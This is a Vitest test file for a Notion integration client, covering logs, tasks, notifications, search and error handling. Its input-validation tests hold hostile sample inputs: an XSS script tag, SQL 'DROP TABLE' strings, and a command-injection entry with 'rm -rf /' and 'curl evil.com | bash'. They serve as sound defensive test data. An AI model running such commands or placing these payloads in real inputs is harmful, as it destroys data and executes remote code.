/**
 * Tests for NotionClient (src/integrations/notion/notion-client.ts)
 *
 * This is the alternative Notion client implementation that provides:
 * - Daily logs and briefings
 * - Task management
 * - Notification inbox
 * - Activity logging
 *
 * Covers:
 * - API error handling
 * - Rate limiting scenarios
 * - Input validation (no injection of malicious content)
 * - Proper authentication handling
 * - Data sanitization
 */

import { describe, it, expect, beforeEach, vi, afterEach, type Mock } from 'vitest';
import {
  NotionClient,
  createNotionClient,
  type NotionConfig,
  type DailyLogEntry,
  type TaskEntry,
  type NotificationEntry,
} from '../../../../src/integrations/notion/notion-client.js';

// Mock the @notionhq/client
vi.mock('@notionhq/client', () => ({
  Client: vi.fn().mockImplementation(() => ({
    pages: {
      create: vi.fn(),
      update: vi.fn(),
    },
    blocks: {
      children: {
        append: vi.fn(),
      },
    },
    users: {
      me: vi.fn(),
    },
    search: vi.fn(),
  })),
}));

// Mock global fetch
const mockFetch = vi.fn();
global.fetch = mockFetch;

import { Client } from '@notionhq/client';

describe('NotionClient (notion-client.ts)', () => {
  let client: NotionClient;
  let mockNotionClient: {
    pages: { create: Mock; update: Mock };
    blocks: { children: { append: Mock } };
    users: { me: Mock };
    search: Mock;
  };

  const validConfig: NotionConfig = {
    apiKey: 'secret_test_api_key_1234567890abcdef',
    dailyLogsPageId: 'page-logs-12345678-1234-1234-1234-123456789012',
    tasksDbId: 'db-tasks-12345678-1234-1234-1234-123456789012',
    inboxDbId: 'db-inbox-12345678-1234-1234-1234-123456789012',
  };

  beforeEach(() => {
    vi.clearAllMocks();

    mockNotionClient = {
      pages: { create: vi.fn(), update: vi.fn() },
      blocks: { children: { append: vi.fn() } },
      users: { me: vi.fn() },
      search: vi.fn(),
    };

    (Client as Mock).mockImplementation(() => mockNotionClient);

    client = new NotionClient(validConfig);
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  // ── Constructor and Factory ─────────────────────────────────────────────────

  describe('constructor', () => {
    it('should initialize Client with API key', () => {
      expect(Client).toHaveBeenCalledWith({ auth: validConfig.apiKey });
    });

    it('should store config', () => {
      // Client is created, config is stored internally
      expect(Client).toHaveBeenCalled();
    });
  });

  describe('createNotionClient factory', () => {
    it('should create NotionClient instance', () => {
      const factoryClient = createNotionClient(validConfig);
      expect(factoryClient).toBeInstanceOf(NotionClient);
    });
  });

  // ── Create Daily Log ────────────────────────────────────────────────────────

  describe('createDailyLog()', () => {
    it('should create daily log page with default date', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'log-page-123' });

      const result = await client.createDailyLog();

      expect(result).toBe('log-page-123');
      expect(mockNotionClient.pages.create).toHaveBeenCalled();

      const createCall = mockNotionClient.pages.create.mock.calls[0][0];
      expect(createCall.parent).toEqual({ page_id: validConfig.dailyLogsPageId });
      expect(createCall.properties.title.title[0].text.content).toContain('ARI Log');
    });

    it('should create daily log page with specific date', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'log-page-123' });

      const specificDate = new Date('2024-06-15T12:00:00.000Z');
      await client.createDailyLog(specificDate);

      const createCall = mockNotionClient.pages.create.mock.calls[0][0];
      expect(createCall.properties.title.title[0].text.content).toBe('ARI Log - 2024-06-15');
    });

    it('should include all section headings in the page structure', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'log-page-123' });

      await client.createDailyLog();

      const createCall = mockNotionClient.pages.create.mock.calls[0][0];
      const children = createCall.children;

      // Should have sections for Morning Briefing, Activity Log, Evening Summary
      const headings = children.filter((c: { type: string }) => c.type === 'heading_2');
      expect(headings.length).toBeGreaterThanOrEqual(3);

      const headingTexts = headings.map(
        (h: { heading_2: { rich_text: Array<{ text: { content: string } }> } }) =>
          h.heading_2.rich_text[0].text.content
      );
      expect(headingTexts).toContain('Morning Briefing');
      expect(headingTexts).toContain('Activity Log');
      expect(headingTexts).toContain('Evening Summary');
    });

    it('should handle API errors', async () => {
      mockNotionClient.pages.create.mockRejectedValue(new Error('API error'));

      await expect(client.createDailyLog()).rejects.toThrow('API error');
    });
  });

  // ── Add Log Entry ───────────────────────────────────────────────────────────

  describe('addLogEntry()', () => {
    const baseEntry: DailyLogEntry = {
      title: 'Test Entry',
      content: 'Test content',
      category: 'notification',
    };

    it('should append entry to specified page', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      await client.addLogEntry(baseEntry, 'target-page-123');

      expect(mockNotionClient.blocks.children.append).toHaveBeenCalledWith(
        expect.objectContaining({
          block_id: 'target-page-123',
        })
      );
    });

    it('should use dailyLogsPageId when no page specified', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      await client.addLogEntry(baseEntry);

      expect(mockNotionClient.blocks.children.append).toHaveBeenCalledWith(
        expect.objectContaining({
          block_id: validConfig.dailyLogsPageId,
        })
      );
    });

    it('should include priority emoji when provided', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      await client.addLogEntry({ ...baseEntry, priority: 'P1' });

      const appendCall = mockNotionClient.blocks.children.append.mock.calls[0][0];
      const content = appendCall.children[0].callout.rich_text[0].text.content;
      expect(content).toContain('\u{1F7E0}'); // orange circle for P1
    });

    it('should include category emoji', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      const categories: Array<{ category: DailyLogEntry['category']; emoji: string }> = [
        { category: 'briefing', emoji: '\u{1F4CB}' },
        { category: 'summary', emoji: '\u{1F4CA}' },
        { category: 'notification', emoji: '\u{1F514}' },
        { category: 'action', emoji: '\u26A1' },
        { category: 'error', emoji: '\u274C' },
      ];

      for (const { category, emoji } of categories) {
        await client.addLogEntry({ ...baseEntry, category });

        const lastCall = mockNotionClient.blocks.children.append.mock.calls.slice(-1)[0][0];
        expect(lastCall.children[0].callout.icon.emoji).toBe(emoji);
      }
    });

    it('should include timestamp in entry', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      await client.addLogEntry(baseEntry);

      const appendCall = mockNotionClient.blocks.children.append.mock.calls[0][0];
      const content = appendCall.children[0].callout.rich_text[0].text.content;
      // Should contain time in format like [HH:MM AM/PM]
      expect(content).toMatch(/\[\d{1,2}:\d{2} [AP]M\]/);
    });

    it('should handle custom timestamp', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      const customTime = new Date('2024-06-15T14:30:00.000Z');
      await client.addLogEntry({ ...baseEntry, timestamp: customTime });

      expect(mockNotionClient.blocks.children.append).toHaveBeenCalled();
    });

    it('should handle API errors', async () => {
      mockNotionClient.blocks.children.append.mockRejectedValue(new Error('API error'));

      await expect(client.addLogEntry(baseEntry)).rejects.toThrow('API error');
    });
  });

  // ── Add Task ────────────────────────────────────────────────────────────────

  describe('addTask()', () => {
    const baseTask: TaskEntry = {
      name: 'Test Task',
      status: 'Not started',
      priority: 'Medium',
    };

    it('should create task in tasks database', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'task-123' });

      const result = await client.addTask(baseTask);

      expect(result).toBe('task-123');
      expect(mockNotionClient.pages.create).toHaveBeenCalledWith(
        expect.objectContaining({
          parent: { database_id: validConfig.tasksDbId },
        })
      );
    });

    it('should include task name, status, and priority', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'task-123' });

      await client.addTask(baseTask);

      const createCall = mockNotionClient.pages.create.mock.calls[0][0];
      expect(createCall.properties['Task name'].title[0].text.content).toBe('Test Task');
      expect(createCall.properties.Status.status.name).toBe('Not started');
      expect(createCall.properties.Priority.select.name).toBe('Medium');
    });

    it('should include description when provided', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'task-123' });

      await client.addTask({ ...baseTask, description: 'Task description' });

      const createCall = mockNotionClient.pages.create.mock.calls[0][0];
      expect(createCall.properties.Description.rich_text[0].text.content).toBe('Task description');
    });

    it('should include due date when provided', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'task-123' });

      const dueDate = new Date('2024-12-31');
      await client.addTask({ ...baseTask, dueDate });

      const createCall = mockNotionClient.pages.create.mock.calls[0][0];
      expect(createCall.properties['Due date'].date.start).toBe('2024-12-31');
    });

    it('should handle API errors', async () => {
      mockNotionClient.pages.create.mockRejectedValue(new Error('API error'));

      await expect(client.addTask(baseTask)).rejects.toThrow('API error');
    });
  });

  // ── Get Tasks ───────────────────────────────────────────────────────────────

  describe('getTasks()', () => {
    beforeEach(() => {
      mockFetch.mockResolvedValue({
        json: () => Promise.resolve({
          results: [
            { id: 'task-1', object: 'page', properties: { name: 'Task 1' } },
            { id: 'task-2', object: 'page', properties: { name: 'Task 2' } },
          ],
        }),
      });
    });

    it('should fetch all tasks by default', async () => {
      const tasks = await client.getTasks();

      expect(mockFetch).toHaveBeenCalledWith(
        expect.stringContaining(`/databases/${validConfig.tasksDbId}/query`),
        expect.objectContaining({
          method: 'POST',
          headers: expect.objectContaining({
            'Authorization': `Bearer ${validConfig.apiKey}`,
            'Notion-Version': '2022-06-28',
            'Content-Type': 'application/json',
          }),
        })
      );
      expect(tasks).toHaveLength(2);
    });

    it('should filter pending tasks', async () => {
      await client.getTasks('pending');

      const fetchCall = mockFetch.mock.calls[0];
      const body = JSON.parse(fetchCall[1].body);
      expect(body.filter).toEqual({
        property: 'Status',
        status: { does_not_equal: 'Done' },
      });
    });

    it('should filter completed tasks', async () => {
      await client.getTasks('completed');

      const fetchCall = mockFetch.mock.calls[0];
      const body = JSON.parse(fetchCall[1].body);
      expect(body.filter).toEqual({
        property: 'Status',
        status: { equals: 'Done' },
      });
    });

    it('should sort by due date ascending', async () => {
      await client.getTasks();

      const fetchCall = mockFetch.mock.calls[0];
      const body = JSON.parse(fetchCall[1].body);
      expect(body.sorts).toContainEqual({
        property: 'Due date',
        direction: 'ascending',
      });
    });

    it('should filter out results without properties', async () => {
      mockFetch.mockResolvedValue({
        json: () => Promise.resolve({
          results: [
            { id: 'task-1', object: 'page', properties: { name: 'Task 1' } },
            { id: 'task-2', object: 'page' }, // No properties
          ],
        }),
      });

      const tasks = await client.getTasks();

      expect(tasks).toHaveLength(1);
    });

    it('should handle fetch errors', async () => {
      mockFetch.mockRejectedValue(new Error('Network error'));

      await expect(client.getTasks()).rejects.toThrow('Network error');
    });
  });

  // ── Update Task Status ──────────────────────────────────────────────────────

  describe('updateTaskStatus()', () => {
    it('should update task status', async () => {
      mockNotionClient.pages.update.mockResolvedValue({});

      await client.updateTaskStatus('task-123', 'In progress');

      expect(mockNotionClient.pages.update).toHaveBeenCalledWith({
        page_id: 'task-123',
        properties: {
          Status: { status: { name: 'In progress' } },
        },
      });
    });

    it('should handle all valid statuses', async () => {
      mockNotionClient.pages.update.mockResolvedValue({});

      const statuses: Array<'Not started' | 'In progress' | 'Done'> = [
        'Not started',
        'In progress',
        'Done',
      ];

      for (const status of statuses) {
        await client.updateTaskStatus('task-123', status);
        expect(mockNotionClient.pages.update).toHaveBeenCalledWith(
          expect.objectContaining({
            properties: {
              Status: { status: { name: status } },
            },
          })
        );
      }
    });

    it('should handle API errors', async () => {
      mockNotionClient.pages.update.mockRejectedValue(new Error('API error'));

      await expect(client.updateTaskStatus('task-123', 'Done')).rejects.toThrow('API error');
    });
  });

  // ── Add Notification ────────────────────────────────────────────────────────

  describe('addNotification()', () => {
    const baseNotification: NotificationEntry = {
      title: 'Test Notification',
      body: 'Notification body',
      category: 'alerts',
      priority: 'P2',
      timestamp: new Date(),
    };

    describe('with inbox database', () => {
      it('should create notification in inbox database', async () => {
        mockNotionClient.pages.create.mockResolvedValue({ id: 'notif-123' });

        const result = await client.addNotification(baseNotification);

        expect(result).toBe('notif-123');
        expect(mockNotionClient.pages.create).toHaveBeenCalledWith(
          expect.objectContaining({
            parent: { database_id: validConfig.inboxDbId },
          })
        );
      });

      it('should include all notification properties', async () => {
        mockNotionClient.pages.create.mockResolvedValue({ id: 'notif-123' });

        await client.addNotification(baseNotification);

        const createCall = mockNotionClient.pages.create.mock.calls[0][0];
        expect(createCall.properties.Title.title[0].text.content).toBe('Test Notification');
        expect(createCall.properties.Category.select.name).toBe('alerts');
        expect(createCall.properties.Priority.select.name).toBe('P2');
        expect(createCall.properties.Acknowledged.checkbox).toBe(false);
      });

      it('should include acknowledged status when true', async () => {
        mockNotionClient.pages.create.mockResolvedValue({ id: 'notif-123' });

        await client.addNotification({ ...baseNotification, acknowledged: true });

        const createCall = mockNotionClient.pages.create.mock.calls[0][0];
        expect(createCall.properties.Acknowledged.checkbox).toBe(true);
      });

      it('should include body in page content', async () => {
        mockNotionClient.pages.create.mockResolvedValue({ id: 'notif-123' });

        await client.addNotification(baseNotification);

        const createCall = mockNotionClient.pages.create.mock.calls[0][0];
        expect(createCall.children[0].paragraph.rich_text[0].text.content).toBe(
          'Notification body'
        );
      });
    });

    describe('without inbox database', () => {
      let clientNoInbox: NotionClient;

      beforeEach(() => {
        const configNoInbox: NotionConfig = {
          apiKey: validConfig.apiKey,
          dailyLogsPageId: validConfig.dailyLogsPageId,
          tasksDbId: validConfig.tasksDbId,
          // No inboxDbId
        };
        clientNoInbox = new NotionClient(configNoInbox);
      });

      it('should add to daily log instead', async () => {
        mockNotionClient.blocks.children.append.mockResolvedValue({});

        const result = await clientNoInbox.addNotification(baseNotification);

        expect(result).toBe('added-to-daily-log');
        expect(mockNotionClient.blocks.children.append).toHaveBeenCalled();
      });

      it('should use notification category for log entry', async () => {
        mockNotionClient.blocks.children.append.mockResolvedValue({});

        await clientNoInbox.addNotification(baseNotification);

        const appendCall = mockNotionClient.blocks.children.append.mock.calls[0][0];
        const content = appendCall.children[0].callout.rich_text[0].text.content;
        expect(content).toContain('Test Notification');
      });
    });
  });

  // ── Morning Briefing ────────────────────────────────────────────────────────

  describe('createMorningBriefing()', () => {
    it('should create briefing with all sections', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      await client.createMorningBriefing({
        weather: 'Sunny, 72F',
        calendar: ['Meeting at 10 AM', 'Lunch at 12 PM'],
        tasks: ['Complete report', 'Review PR'],
        reminders: ['Call dentist', 'Pick up groceries'],
      });

      expect(mockNotionClient.blocks.children.append).toHaveBeenCalled();

      const appendCall = mockNotionClient.blocks.children.append.mock.calls[0][0];
      const content = appendCall.children[0].callout.rich_text[0].text.content;

      expect(content).toContain('Weather: Sunny, 72F');
      expect(content).toContain("Today's Schedule:");
      expect(content).toContain('Meeting at 10 AM');
      expect(content).toContain('Priority Tasks:');
      expect(content).toContain('Reminders:');
    });

    it('should handle empty sections', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      await client.createMorningBriefing({});

      expect(mockNotionClient.blocks.children.append).toHaveBeenCalled();
    });

    it('should skip undefined sections', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      await client.createMorningBriefing({
        weather: 'Sunny',
      });

      const appendCall = mockNotionClient.blocks.children.append.mock.calls[0][0];
      const content = appendCall.children[0].callout.rich_text[0].text.content;

      expect(content).toContain('Weather: Sunny');
      expect(content).not.toContain("Today's Schedule:");
    });
  });

  // ── Evening Summary ─────────────────────────────────────────────────────────

  describe('createEveningSummary()', () => {
    it('should create summary with all sections', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      await client.createEveningSummary({
        completed: ['Task A', 'Task B'],
        pending: ['Task C'],
        highlights: ['Great meeting'],
        tomorrow: ['Follow up with team'],
      });

      expect(mockNotionClient.blocks.children.append).toHaveBeenCalled();

      const appendCall = mockNotionClient.blocks.children.append.mock.calls[0][0];
      const content = appendCall.children[0].callout.rich_text[0].text.content;

      expect(content).toContain('Completed Today:');
      expect(content).toContain('Task A');
      expect(content).toContain('Still Pending:');
      expect(content).toContain('Highlights:');
      expect(content).toContain('Tomorrow:');
    });

    it('should handle empty sections', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      await client.createEveningSummary({});

      expect(mockNotionClient.blocks.children.append).toHaveBeenCalled();
    });
  });

  // ── Search ──────────────────────────────────────────────────────────────────

  describe('search()', () => {
    it('should search for pages', async () => {
      mockNotionClient.search.mockResolvedValue({
        results: [
          { id: 'page-1', object: 'page', properties: { title: 'Page 1' } },
          { id: 'page-2', object: 'page', properties: { title: 'Page 2' } },
        ],
      });

      const results = await client.search('test query');

      expect(mockNotionClient.search).toHaveBeenCalledWith({
        query: 'test query',
        filter: { property: 'object', value: 'page' },
        page_size: 10,
      });
      expect(results).toHaveLength(2);
    });

    it('should filter out results without properties', async () => {
      mockNotionClient.search.mockResolvedValue({
        results: [
          { id: 'page-1', object: 'page', properties: { title: 'Page 1' } },
          { id: 'page-2', object: 'page' }, // No properties
        ],
      });

      const results = await client.search('test');

      expect(results).toHaveLength(1);
    });

    it('should handle empty results', async () => {
      mockNotionClient.search.mockResolvedValue({ results: [] });

      const results = await client.search('nonexistent');

      expect(results).toEqual([]);
    });
  });

  // ── Verify Connection ───────────────────────────────────────────────────────

  describe('verify()', () => {
    it('should return true on successful verification', async () => {
      mockNotionClient.users.me.mockResolvedValue({ id: 'user-123' });

      const result = await client.verify();

      expect(result).toBe(true);
    });

    it('should return false on error', async () => {
      mockNotionClient.users.me.mockRejectedValue(new Error('Unauthorized'));

      const result = await client.verify();

      expect(result).toBe(false);
    });
  });

  // ── Input Validation and Security ───────────────────────────────────────────

  describe('input validation', () => {
    it('should handle task name with special characters', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'task-123' });

      const task: TaskEntry = {
        name: '<script>alert("XSS")</script>',
        status: 'Not started',
        priority: 'High',
      };

      await client.addTask(task);

      expect(mockNotionClient.pages.create).toHaveBeenCalled();
    });

    it('should handle notification with SQL injection in body', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'notif-123' });

      const notification: NotificationEntry = {
        title: 'Test',
        body: "'; DROP TABLE users; --",
        category: 'test',
        priority: 'P2',
        timestamp: new Date(),
      };

      await client.addNotification(notification);

      expect(mockNotionClient.pages.create).toHaveBeenCalled();
    });

    it('should handle log entry with command injection', async () => {
      mockNotionClient.blocks.children.append.mockResolvedValue({});

      const entry: DailyLogEntry = {
        title: '$(rm -rf /)',
        content: 'curl evil.com | bash',
        category: 'action',
      };

      await client.addLogEntry(entry);

      expect(mockNotionClient.blocks.children.append).toHaveBeenCalled();
    });

    it('should handle unicode content', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'task-123' });

      const task: TaskEntry = {
        name: 'Task with emoji \u{1F680} and unicode \u00E9\u00E8\u00EA',
        status: 'Not started',
        priority: 'Medium',
        description: '\u{1F4DD} Notes here',
      };

      await client.addTask(task);

      expect(mockNotionClient.pages.create).toHaveBeenCalled();
    });

    it('should handle null bytes in content', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'task-123' });

      const task: TaskEntry = {
        name: 'Task\x00Name',
        status: 'Not started',
        priority: 'Low',
      };

      await client.addTask(task);

      expect(mockNotionClient.pages.create).toHaveBeenCalled();
    });

    it('should handle very long task descriptions', async () => {
      mockNotionClient.pages.create.mockResolvedValue({ id: 'task-123' });

      const task: TaskEntry = {
        name: 'Long Task',
        status: 'Not started',
        priority: 'Medium',
        description: 'D'.repeat(10000),
      };

      await client.addTask(task);

      expect(mockNotionClient.pages.create).toHaveBeenCalled();
    });

    it('should handle search query with special regex characters', async () => {
      mockNotionClient.search.mockResolvedValue({ results: [] });

      await client.search('.*+?^${}()|[]\\');

      expect(mockNotionClient.search).toHaveBeenCalled();
    });
  });

  // ── API Error Handling ──────────────────────────────────────────────────────

  describe('API error handling', () => {
    it('should propagate rate limit errors from pages.create', async () => {
      const rateLimitError = new Error('Rate limited');
      (rateLimitError as unknown as { status: number }).status = 429;
      mockNotionClient.pages.create.mockRejectedValue(rateLimitError);

      await expect(client.addTask({
        name: 'Test',
        status: 'Not started',
        priority: 'Low',
      })).rejects.toThrow('Rate limited');
    });

    it('should propagate unauthorized errors', async () => {
      const authError = new Error('Unauthorized');
      (authError as unknown as { status: number }).status = 401;
      mockNotionClient.pages.create.mockRejectedValue(authError);

      await expect(client.createDailyLog()).rejects.toThrow('Unauthorized');
    });

    it('should handle network timeouts', async () => {
      const timeoutError = new Error('Request timeout');
      timeoutError.name = 'TimeoutError';
      mockNotionClient.pages.create.mockRejectedValue(timeoutError);

      await expect(client.addTask({
        name: 'Test',
        status: 'Not started',
        priority: 'Low',
      })).rejects.toThrow('Request timeout');
    });

    it('should handle malformed API responses for getTasks', async () => {
      mockFetch.mockResolvedValue({
        json: () => Promise.resolve({}), // Missing results
      });

      await expect(client.getTasks()).rejects.toThrow();
    });
  });

  // ── Security Tests ──────────────────────────────────────────────────────────

  describe('security - API key handling', () => {
    it('should use API key in Authorization header for fetch', async () => {
      mockFetch.mockResolvedValue({
        json: () => Promise.resolve({ results: [] }),
      });

      await client.getTasks();

      const fetchCall = mockFetch.mock.calls[0];
      expect(fetchCall[1].headers.Authorization).toBe(`Bearer ${validConfig.apiKey}`);
    });

    it('should pass API key to Client constructor', () => {
      expect(Client).toHaveBeenCalledWith({ auth: validConfig.apiKey });
    });
  });

  describe('security - injection prevention', () => {
    it('should pass database ID as-is (API handles validation)', async () => {
      mockFetch.mockResolvedValue({
        json: () => Promise.resolve({ results: [] }),
      });

      await client.getTasks();

      const fetchCall = mockFetch.mock.calls[0];
      expect(fetchCall[0]).toContain(validConfig.tasksDbId);
    });

    it('should handle page ID with injection attempt', async () => {
      mockNotionClient.pages.update.mockResolvedValue({});

      // Page ID with potential injection - should be passed through
      await client.updateTaskStatus('page-id"; DROP TABLE--', 'Done');

      expect(mockNotionClient.pages.update).toHaveBeenCalledWith(
        expect.objectContaining({
          page_id: 'page-id"; DROP TABLE--',
        })
      );
    });
  });
});
